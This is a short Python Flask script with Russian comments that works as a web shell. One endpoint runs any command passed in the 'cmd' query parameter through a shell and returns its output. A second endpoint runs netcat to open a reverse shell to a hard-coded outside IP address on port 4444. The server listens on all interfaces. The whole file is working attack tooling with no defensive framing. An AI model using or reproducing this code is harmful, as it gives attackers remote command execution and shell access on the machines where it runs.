from flask import Flask, request
import os
import subprocess

app = Flask(__name__)


@app.get("/e")
def cmd():
    try:
        # Выполняем команду и получаем вывод
        name = request.args.get('cmd', 'whoami')
        result = subprocess.run(name, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout  # Возвращаем стандартный вывод
    except subprocess.CalledProcessError as e:
        return f"Ошибка выполнения команды: {e.stderr}"

@app.get("/revshell")
def revshell():
    os.system('nc 138.124.101.70 4444 -e /bin/sh')
    return 'runned'

app.run(host='0.0.0.0')